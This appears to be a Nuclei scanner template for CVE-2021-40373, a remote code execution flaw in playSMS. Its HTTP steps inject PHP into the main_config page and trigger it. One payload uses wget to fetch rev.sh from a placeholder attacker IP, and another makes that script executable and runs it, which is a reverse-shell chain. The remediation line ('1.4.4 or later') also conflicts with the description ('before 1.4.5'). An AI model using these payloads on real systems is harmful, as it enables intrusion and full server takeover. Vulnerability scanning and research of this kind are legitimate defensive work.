id: CVE-2021-40373

info:
  name: playSMS 1.4.3 Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: playSMS before 1.4.5 allows Arbitrary Code Execution by entering PHP code at the #tabs-information-page of core_main_config, and then executing that code via the index.php?app=main&inc=core_welcome URI.
  impact: |
    Successful exploitation could allow an attacker to execute arbitrary code on the target system.
  remediation: |
    Upgrade to playSMS version 1.4.4 or later to mitigate CVE-2021-40373.
  reference:
    - https://github.com/maikroservice/CVE-2021-40373
    - https://github.com/soosmile/POC
    - https://github.com/WhooAmii/POC_to_review
    - https://github.com/NaInSec/CVE-PoC-in-GitHub
    - https://github.com/ProjectOnez/ProjectOnez
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-40373
    cwe-id: CWE-94
    epss-score: 0.03731
    epss-percentile: 0.92104
    cpe: cpe:2.3:a:playsms:playsms:*:*:*:*:*:*:*:*
  metadata:
    vendor: playsms
    product: playsms

http:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?app=main&inc=core_main_config&op=main_config"

    body: |
      <?php system("/usr/bin/wget http://<attackerIP>/rev.sh"); echo "done" ?>

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "done"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/index.php?app=main&inc=core_welcome"

    matchers:
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/index.php?app=main&inc=core_main_config&op=main_config"

    body: |
      <?php system("chmod +x rev.sh && ./rev.sh") ?>

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "chmod +x rev.sh && ./rev.sh"
        part: body
